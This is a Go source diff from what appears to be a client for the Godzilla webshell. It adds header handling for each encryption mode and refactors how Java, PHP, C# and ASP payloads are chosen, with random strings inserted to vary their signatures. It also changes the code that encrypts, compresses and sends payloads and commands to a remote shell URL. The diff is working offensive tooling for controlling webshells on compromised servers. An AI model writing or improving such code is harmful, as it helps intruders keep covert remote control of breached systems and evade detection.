@@ -53,8 +53,31 @@ func NewGodzillaInfo(g *GodzillaInfo) (*GodzillaInfo, error) {
 	if g.Headers == nil {
 		g.Headers = make(map[string]string, 2)
 	}
+	g.Headers = g.setHeaders()
+
 	g.Client = httpx.NewClient(g.Proxy, g.Headers, g.Script, g.Crypto)
 	return g, nil
+}
+
+func (g *GodzillaInfo) setHeaders() map[string]string {
+	h := g.Headers
+	switch g.Crypto {
+	case godzilla.JAVA_AES_BASE64:
+		fallthrough
+	case godzilla.CSHARP_AES_BASE64:
+		fallthrough
+	case godzilla.PHP_XOR_BASE64:
+		fallthrough
+	case godzilla.ASP_XOR_BASE64:
+		h["Content-type"] = "application/x-www-form-urlencoded"
+	case godzilla.JAVA_AES_RAW:
+	case godzilla.CSHARP_AES_RAW:
+	case godzilla.PHP_XOR_RAW:
+	case godzilla.ASP_XOR_RAW:
+	default:
+		panic("shell script type error [jsp/jspx/asp/aspx/php]")
+	}
+	return h
 }
 
 func (g *GodzillaInfo) Encodeing() {
@@ -62,24 +85,23 @@ func (g *GodzillaInfo) Encodeing() {
 }
 
 func (g *GodzillaInfo) GetPayload() []byte {
+	var payload []byte
 	if g.Script == shell.JavaScript {
-		data := payloads.GodClassFiles
-		// 原始类名为 payloadv4
-		return g.dynamicUpdateClassName("payloadv4", data)
+		payload = payloads.GodzillaClassPayload
+		// 原始类名被我改为 payloadv4 了
+		payload = g.dynamicUpdateClassName("payloadv4", payload)
 	} else if g.Script == shell.PhpScript {
-		data := payloads.GodPhpFiles
-		r1 := utils.RandomRangeString(20, 200)
-		data = bytes.Replace(data, []byte("FLAG_STR"), []byte(r1), 1)
-		return data
+		payload = payloads.GodzillaPhpPayload
+		r1 := utils.RandomRangeString(5, 50)
+		payload = bytes.Replace(payload, []byte("FLAG_STR"), []byte(r1), 1)
 	} else if g.Script == shell.CsharpScript {
-		data := payloads.GodDllFiles
-		return data
+		payload = payloads.GodzillaCsharpPayload
 	} else if g.Script == shell.AspScript {
-		data := payloads.GodAspFiles
-		return data
-	} else {
-		return nil
+		payload = payloads.GodzillaAspPayload
+		r1 := utils.RandomRangeString(5, 50)
+		payload = bytes.Replace(payload, []byte("FLAG_STR"), []byte(r1), 1)
 	}
+	return payload
 }
 
 // EvalFunc 个人简单理解为调用远程 shell 的一个方法，以及对指令的序列化，并且发送指令
@@ -106,8 +128,8 @@ func (g *GodzillaInfo) sendPayload(payload []byte) []byte {
 	var enData []byte
 	if g.Script == shell.AspScript {
 		enData = godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
-		result, ok := g.Client.DoRequestAndMatch(g.Url, string(enData), 0, 0)
-		if !ok {
+		result, err := g.Client.DoRequest(g.Url, string(enData))
+		if err != nil {
 			panic("EvalFunc1 error")
 		}
 		deData := godzilla.Decrypto(result.RawBody, g.secretKey, g.Password, g.Crypto, g.Script)
@@ -115,8 +137,8 @@ func (g *GodzillaInfo) sendPayload(payload []byte) []byte {
 	} else {
 		gzipData, _ := gzip.GzipCompress(payload)
 		enData = godzilla.Encrypto(gzipData, g.secretKey, g.Password, g.Crypto, g.Script)
-		result, ok := g.Client.DoRequestAndMatch(g.Url, string(enData), 0, 0)
-		if !ok {
+		result, err := g.Client.DoRequest(g.Url, string(enData))
+		if err != nil {
 			panic("EvalFunc1 error")
 		}
 		deData := godzilla.Decrypto(result.RawBody, g.secretKey, g.Password, g.Crypto, g.Script)
@@ -161,10 +183,10 @@ func getParameter() *godzilla.Parameter {
 // InjectPayload 第一次发送全部的 payload
 func (g *GodzillaInfo) InjectPayload() {
 	payload := g.GetPayload()
-	data := godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
-	_, ok := g.Client.DoRequestAndMatch(g.Url, string(data), 0, 0)
-	if !ok {
-		panic("EvalFunc error")
+	encrypt := godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
+	_, err := g.Client.DoRequest(g.Url, string(encrypt))
+	if err != nil {
+		panic("InjectPayload error")
 	}
 }
 
